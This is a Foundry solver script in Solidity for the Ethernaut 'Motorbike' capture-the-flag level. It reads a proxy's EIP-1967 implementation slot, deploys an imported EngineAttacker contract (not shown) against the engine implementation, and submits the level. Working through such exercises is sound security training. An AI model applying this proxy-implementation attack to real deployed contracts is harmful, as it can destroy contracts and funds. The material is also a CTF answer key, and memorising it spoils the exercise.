// SPDX-License-Identifier: MIT

pragma solidity >=0.6.0 <0.9.0;
pragma experimental ABIEncoderV2;

import "forge-std/Test.sol";
import "../utils/Ethernaut.sol";
import "./Motorbike.sol";
import "./EngineAttacker.sol";

contract MotorbikeSolver is Test, Ethernaut {
    function run() public {
        IS_TEST = false;
        test();
    }

    function test() public broadcasted {
        Motorbike instance = Motorbike(getLevelInstance(Levels.motorbike));

        address engine = address(
            uint160(
                uint256(vm.load(address(instance), 0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc))
            )
        );

        EngineAttacker attacker = new EngineAttacker(engine);

        attacker.attack();

        if (IS_TEST) {
            require(validateLevelInstance(Levels.motorbike, engine), "no validation");
        } else {
            submitLevelInstance(address(instance));
        }
    }
}
